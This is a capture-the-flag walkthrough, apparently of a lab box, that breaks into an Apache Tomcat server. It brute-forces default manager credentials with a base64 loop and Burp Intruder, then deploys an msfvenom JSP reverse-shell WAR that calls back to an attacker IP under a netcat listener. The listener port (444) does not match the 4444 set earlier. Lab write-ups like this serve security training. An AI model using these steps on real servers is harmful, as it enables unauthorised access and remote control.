Our first step is to run nmap. Only port ```8080``` is open. The alternative to port ```80```. There's some information disclosure as some service information is included.

![nmap-scan-results](/assets/img/jerry/jerry-nmap.png)

We navigate to "http://10.10.10.95:8080/" and find a default web page. I wonder if we can gain access to the web server with default credentials?

![default-apache-page](/assets/img/jerry/apache-default.png)

We search Google for "tomcat default credentials". THe first result is "https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown". We will use this list to bruteforce our way in. There are tools to automate this process but we're going to it manually.

![default-tomcat-credentails](/assets/img/jerry/git-default-creds.png)

Copy all the default creds into a text file. I'm using Mousepad. Use Find and Replace to search for the space ("  "), replace it with a colon, then select replace all and hit save. I saved mine as tomcat.txt

![find-and-replace](/assets/img/jerry/find&replace.png)

Now in your browser, go to Preferences > Settings (bottom of pages). In connection settings select manual proxy. CHange the proxy to ```127.0.0.1``` and Port to ```8080```. Select "Also use this proxy for FTP and HTTPS". And press okay.

![change-browser-proxy-settings](/assets/img/jerry/browser-proxy-settings.png)

Fire up Burp Suite, select "Temporary project" and "Next" > "Use Burp defaults" and select "Start Burp".

![start-burp](/assets/img/jerry/start-burp.png)

We're going to write a bash script that we'll use to bruteforce our way into the web server.
```bash
for cred in $(cat tomcat.txt); do echo -n $cred | base64; done
```
This is going iterate through each line in the .txt file, convert it into base64 and print it out. Copy the base64 list.

![convert-to-base64](/assets/img/jerry/base64.png)

Next we return to the Apache Tomcat page and select "Manager App". Nothing happens because Burp has intercepted the request. So we navigate to Burp suite, look for the Proxy tab and "Forward" the request.

![first-burp-request](/assets/img/jerry/burp-1st-request.png)

We go back to the Apache web page and select "OK" in the pop up, without entering any credentials. Back in burpe, under the proxy tab we right click on the request in the raw text area and select "Send to Intruder".

![burp-intruder](/assets/img/jerry/send-to-intruder.png)

Navigate to the "Intruder" tab, then to "Positions". We highlight our payload paramater area and select the "Add" button. The highlighted area is what we will be replacing with our base64 list.

![set-payload-parameter](/assets/img/jerry/burp-payload-parameter.png)

Now select the payloads tab, and under "Payload Options", paste the base64 list we copied. Make sure to deselect the "URL-encode these characters" option. Select "Start Attack".

![paste-base64](/assets/img/jerry/burp-base-paste.png)

Search for the the result with the "200" status code. Those are the correct credentials. To decode it, select the correct payload and below where it shows the request, highlight the base64 string. Right click and select "Send to Decoder". Go to the decoder and select decode as bas64. The output should be "tomcat:s3cret".

![decode-credentials](/assets/img/jerry/creds-decode.png)

We can now set our browser proxy settings back to system proxy settings.

Now that we have access to the web server, we want to upload a malicious file. The malicious file will be a reverse shell that we're going to generate using ```msfvenom```.

The payload we want can be found here "https://mytrickstuff.com/hacks-and-tricks/msfvenom-cheat-sheet-one-page-one-code/".
```msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war```

![cheatsheet](/assets/img/jerry/cheatsheet.png)

We can paste the snippet into the terminal. Adding your ```tun0``` IP as your LHOST, and assigning LPORT to ```4444```. ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.6 LPORT=4444 -f war > shell.war```. Then we start a listener on the same port for our reverse shell to connect to with ```nc -nvlp 444```.

![generate-file-and-start-listener](/assets/img/jerry/generate&listener.png)

In the Apache mamager scroll down to where you see "War file to deploy". Browse and select the WAR file we just generated and select "Deploy". It should now be deployed under Applications in the manager dashboard.

![upload-war-file](/assets/img/jerry/upload-war.png)

Select "/shell" under applications. This initiates the shell and talks back to our listener.

![trigger-shell](/assets/img/jerry/applications-shell.png)

We return to our terminal and see we have a shell. We run whoami and see we have authority\system. Congratulations, you have owned this box!

![system-owned](/assets/img/jerry/owned.png)

Now locate the flags to fully own this system.
